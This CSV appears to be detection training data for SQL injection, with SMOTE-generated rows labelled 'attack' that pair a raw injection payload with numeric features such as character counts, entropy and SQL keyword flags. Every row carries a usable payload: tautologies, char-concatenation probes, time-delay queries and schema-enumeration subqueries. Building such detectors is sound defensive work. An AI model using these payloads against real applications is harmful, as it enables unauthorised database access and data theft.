id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000393,attack,boolean,-5268'  )   where 5615  =  5615 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R002820,0.4101176097933794,361.7234577272427,30.0,3.2856225560696966,83.1671961688183,58.0,169.55626155842438,51.0,0.22987371751269065,0.1603802598207706,0.4687220010999991,0.14102402156653965,0.8054673051969531,-1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,35.194532694803044,0.0,0.0,0.0,15.0,0.8054673051969531,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000394,attack,boolean,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000410,0.15071867893704977,131.85166383766511,29.0,3.89976968069377,65.0,8.0,43.281331070132104,15.570332767533026,0.4931529475038625,0.06069574738509077,0.3280905640809193,0.11806074103012745,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.570332767533026,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000395,attack,boolean,"1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002628,0.04385936389369565,155.15986269134882,35.855017163581394,4.3286828451961785,76.86989701851162,17.0,43.289965672837205,18.0,0.49534289627658645,0.10959925983032988,0.2790115687786167,0.11604627511446694,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,3.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000396,attack,boolean,"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",nearest_attack_euclidean,R001366,0.29122553665644973,90.22482518846074,24.577517481153926,3.2549552508390858,16.0,16.0,43.37986015076859,14.844965037692148,0.17785886591383576,0.17785886591383576,0.47985404135509563,0.16442822681723285,4.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,6.844965037692149,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000397,attack,boolean,"1  )   and make_set  (  1559  =  4863,4863  )  ",nearest_attack_euclidean,R002428,0.06452987467624183,47.0,20.728200529288404,3.5514857046817223,10.0,13.0,18.0,6.0,0.21276595744680854,0.2765957446808511,0.3829787234042553,0.1276595744680851,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.000000000000001,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000398,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod",nearest_attack_euclidean,R001435,0.17508027781858437,126.90656195838685,30.290656195838686,3.6914018178769363,43.0,15.0,50.32524956670948,18.58131239167737,0.33925239743556607,0.1183438595705463,0.3960529593325353,0.14635078366135235,6.0,-1.1102230246251565e-16,0.0,1.0,0.0,2.0,0.0,8.58131239167737,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000399,attack,boolean,"1  )   where 2720  =  2720 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R001941,0.3251196745944951,68.92846862672151,23.31425830045907,3.5153694252583043,12.97138745068861,21.0,26.62851660091814,8.328564575114768,0.1861067329806436,0.3076546991374305,0.3848777324797161,0.12136083540220986,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,3.3285645751147674,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000400,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000052,0.27058990889289325,28.92771327981366,10.347892479930128,3.0101033120943685,16.75376703984861,0.0,7.347892479930124,4.826053760034936,0.5765114161028753,0.0,0.2526355490903798,0.17085303480674502,3.8260537600349367,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0579820799883544,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0579820799883546
SMOTE_000401,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003522,0.18565724447209106,132.23342474833075,35.52917809354135,3.8035361798622054,39.175068561248054,23.0,53.05835618708269,17.0,0.2958413077263238,0.17409416537157588,0.40138623075789204,0.12867829614420825,2.0,-1.1102230246251565e-16,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000402,attack,boolean,"1'||  (  select 'kgjk' where 3530  =  3530 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001688,0.5421725543302448,162.38704376427447,36.2580613978985,4.3441546249310985,83.87092096847748,16.0,42.516122795796996,20.0,0.5157555881330013,0.09872720794834026,0.26210819398323315,0.12340900993542533,3.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,7.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.2580613978984987,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.258061397898499
SMOTE_000403,attack,boolean,"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001709,0.0933119268096212,147.71163233976878,37.47191515533126,4.313842757938661,73.94383031066252,16.0,41.94383031066252,15.823971718443754,0.5006424389837819,0.10844836411502187,0.2837457107537382,0.10716348614745802,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.823971718443754,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000404,attack,boolean,"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",nearest_attack_euclidean,R001125,0.2253209342297488,394.5470496212722,37.867913601933836,3.563436544027586,104.47165440773533,48.0,175.20748161160301,66.86791360193384,0.26477984346864497,0.12166956328334604,0.44406324271842373,0.16948735052958522,0.0,4.0,1.0,0.0,0.0,2.1320863980661655,0.0,35.73582720386767,0.0,3.0,0.0,23.132086398066168,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000405,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'fnon' like 'fnon",nearest_attack_euclidean,R000974,0.15201162669024493,120.7778657326515,26.5396951046645,4.057126847424418,78.88893286632575,3.0000000000000018,26.6190853139935,12.269847552332251,0.6535596975237129,0.0249015725714129,0.21987253463958714,0.10166619526528708,3.0,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,3.2698475523322514,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000406,attack,boolean,"-5579%""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,nearest_attack_euclidean,R000732,0.14329366071897467,360.01936366704354,30.542473486126813,3.1974056430550584,80.0,50.0,174.84946972253624,55.169893944507244,0.22245703182951693,0.13903564489344808,0.48528076895006833,0.1532265543269667,0.0,4.0,1.0,0.0,0.0,2.0,0.0,36.16989394450725,2.0,0.0,0.0,13.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000407,attack,boolean,"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",nearest_attack_euclidean,R002370,0.05332230544899035,86.0,25.423469277331282,3.3431908866193094,16.0,16.0,40.0,14.0,0.18604651162790697,0.18604651162790697,0.46511627906976744,0.16279069767441862,4.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000408,attack,boolean,1'  )   as yyyb where 1705  =  1705 and   (  8770  =  6988  )  *6988--,nearest_attack_euclidean,R000590,0.020612293483411624,70.0,24.0,3.6622593782072834,14.0,21.0,26.0,9.0,0.2,0.3,0.37142857142857144,0.12857142857142856,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,3.000000000000001,0.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000409,attack,boolean,"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""piya""  =  ""piya",nearest_attack_euclidean,R000705,0.028406058198301352,360.81990313982124,30.05856450998723,3.2304834183646953,89.0,47.0,172.7027741198468,52.11712901997446,0.24668024822159768,0.1302693445664617,0.4786094425363606,0.14444096467558007,0.0,4.0,0.0,0.0,0.0,2.0,0.0,36.11712901997447,0.0,0.0,0.0,12.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000410,attack,boolean,"-6948""   )    )    as ojjl where 1300  =  1300 or 6872  =  6872--",nearest_attack_euclidean,R001402,0.08322423355268603,66.32486743366313,23.44162247788771,3.6837758130339053,13.220811238943853,20.294414985258474,24.588829970516947,8.220811238943854,0.1994679247254365,0.30632801211650384,0.3704313493374766,0.12377271382058305,0.0,1.0,3.0,0.0,0.0,2.0,0.0,2.147207492629237,0.0,0.0,0.07360374631461841,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,boolean,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,nearest_attack_euclidean,R000034,0.021161695441484777,54.89798908081325,23.0,3.723049503643128,24.0,4.0,17.89798908081324,9.0,0.4371879670237313,0.07286466117062189,0.32600188417174747,0.16394548763389927,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000412,attack,boolean,-8187'   )    )     )   or 1698  =  2823#,nearest_attack_euclidean,R001258,0.0008931123376517767,41.0,15.0,2.841013660814585,2.0,12.0,20.0,7.0,0.04878048780487804,0.2926829268292683,0.4878048780487805,0.17073170731707318,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,3.000000000000001,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000413,attack,boolean,"-6599%""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000931,0.20342240509602683,87.70793032147003,26.729206967852996,3.3173436930801694,12.0,16.0,42.16634425717603,17.54158606429401,0.1371523016894563,0.18286973558594172,0.479977962724602,0.2,0.0,4.0,1.0,0.0,0.0,2.0,0.0,6.541586064294007,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000414,attack,boolean,-9100  )   or 8792  =  9550--,nearest_attack_euclidean,R003333,0.0322918902654471,29.136549726098707,12.980492896271615,3.1453490625092493,2.0,12.0,10.117042622370313,5.019507103728387,0.06870392772778028,0.4122235663666816,0.3467708225936323,0.17230168331190585,0.0,-1.1102230246251565e-16,3.0,0.0,0.0,1.0,0.0,1.0195071037283858,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000415,attack,boolean,"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""diiv""  =  ""diiv",nearest_attack_euclidean,R001905,0.1816720247573291,149.42720302064757,28.51455939587049,3.7654627371438423,48.0,16.0,57.941762416518046,27.48544060412951,0.3215110385011544,0.10717034616705148,0.38739416725685183,0.1839244480749423,0.0,4.0,0.0,0.0,0.0,2.0,0.0,11.485440604129511,0.0,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R002773,0.008567218413427077,123.13264115014536,29.0,3.6623556082651105,41.0,14.0,49.10611292011629,19.026528230029072,0.33298791367149644,0.11370319003416951,0.39879017230800184,0.1545187239863322,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.026528230029072,1.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000417,attack,boolean,"-8013%"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R002770,0.15394016788219764,368.2112849945564,33.0,3.396166605087012,94.0,50.0,168.36902799564513,55.84225699891128,0.25533392497584545,0.13581591754034333,0.45720062412817347,0.15164953335563777,0.0,4.0,1.0,0.0,0.0,3.0,0.0,34.84225699891129,2.0,0.0,1.0,14.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000418,attack,boolean,"admin"" or ""1""  =  ""1",nearest_attack_euclidean,R000192,0.5755986041645613,20.753436388427545,10.84931272231449,3.0436006927373427,8.05481094379855,1.6986254446289841,6.150687277685506,4.849312722314494,0.38164432831395645,0.0849312722314493,0.29698625444628984,0.23643814500830437,0.0,3.849312722314493,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.15068727768550694,0.849312722314493,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000419,attack,boolean,"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",nearest_attack_euclidean,R001067,0.06782345532448168,63.0,21.214250129577525,3.5722663488435678,10.0,24.0,20.0,9.0,0.15873015873015872,0.38095238095238093,0.31746031746031744,0.14285714285714285,1.0,-1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000420,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000915,0.8166470277591487,89.0,27.44228453501097,3.75765364722067,35.53827628008775,8.0,32.34629278993418,13.115430929978062,0.39930647505716577,0.0898876404494382,0.3634414920217324,0.1473643924716636,0.0,3.0,0.0,0.0,1.0,1.0,0.0,5.55771546498903,0.557715464989031,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000421,attack,boolean,"1 where 6221  =  6221 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001529,0.0433507642162477,149.0,33.66600183353922,4.312824507500904,77.0,17.0,39.0,16.0,0.5167785234899329,0.11409395973154363,0.26174496644295303,0.10738255033557047,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,3.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000422,attack,boolean,"-4639""   )    )     )   or 8550  =  9348",nearest_attack_euclidean,R001979,0.009017157837940281,40.0,13.962862012952437,2.7888332104233307,2.0,12.0,20.0,6.0,0.04999999999999999,0.3,0.5,0.15,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.000000000000001,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
